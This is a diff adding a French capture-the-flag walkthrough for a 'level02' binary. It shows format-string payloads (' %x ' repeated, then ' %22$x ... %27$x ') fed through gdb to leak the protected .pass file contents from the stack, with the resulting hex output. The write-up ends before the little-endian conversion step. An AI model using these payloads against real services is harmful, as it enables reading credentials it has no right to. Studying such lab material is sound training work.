@@ -1,0 +1,50 @@
+le code lit ce qu'il y a dans le fichier de .pass du level02
+
+le soucis est que sur gdb je ne peut pas l'ouvrir car je n'ai pas les droits dessus donc 
+il va me sortir une erreur sur le open:
+
+open("/home/users/level03/.pass", O_RDONLY) = -1 EACCES (Permission denied)
+
+je peux creer un fichier dans /tmp/fichier.txt et le lui faire lire en changeant le nom du fichier avec gdb, puis 
+je rempli ce meme fichier de 41 "A" (41 parce que c'est la taille qui est lu dans le fichier fd_pass_file) pour que ce soit bien visible sur gdb et savoir par la suite a quel emplacement 
+se trouve le fichier
+
+une fois fait je lance gdb avec le binaire et je modifie le nom du fichier avant le call fopen a +148
+
+ $ r <<< $(python -c 'print(" %x " * 200 + "\n" + "fakepassword\n")'); 
+
+le 200 est la juste pour remplir le buffer mais il y en a moins qui sont prit en compte...
+
+$ set $rdi="/tmp/fichier.txt"
+
+$ (gdb) c
+Continuing.
+===== [ Secure Access System v1.0 ] =====
+/***************************************\
+| You must login to access this system. |
+\**************************************/
+--[ Username: --[ Password: *****************************************
+ffffe4d0 0 25 2a2a2a2a 2a2a2a2a ffffe6c8 f7ff9a08 25207825 20782520 78252078 25207825 20782520 78252078 25207825 20782520 78252078 25207825 20782520 78252078 207825 0 --> ICI [41414141 41414141 41414141 41414141 41414141 feff41] <-- ICI 25207825 20782520 78252078 25207825 20782520 78252078  does not have access!
+[Inferior 1 (process 1846) exited with code 01]
+
+on voit notre texte donc oui ca fonctionne pour etre plus precis on peut preciser qu'on ne veut voir que ceux entre 22 et 27 inclus
+
+$  r <<< $(python -c 'print(" %22$x %23$x %24$x %25$x %26$x %27$x " + "\n" + "fakepassword\n")')
+Starting program: /home/users/level02/level02 <<< $(python -c 'print(" %22$x %23$x %24$x %25$x %26$x %27$x " + "\n" + "fakepassword\n")')
+
+$ (gdb) set $rdi="/tmp/fichier.txt"
+
+$ (gdb) c
+Continuing.
+===== [ Secure Access System v1.0 ] =====
+/***************************************\
+| You must login to access this system. |
+\**************************************/
+--[ Username: --[ Password: *****************************************
+41414141 41414141 41414141 41414141 41414141 feff41 fakepassword does not have access!
+
+on a le texte maintenant il faut le traduire en litle endian
+
+
+
+
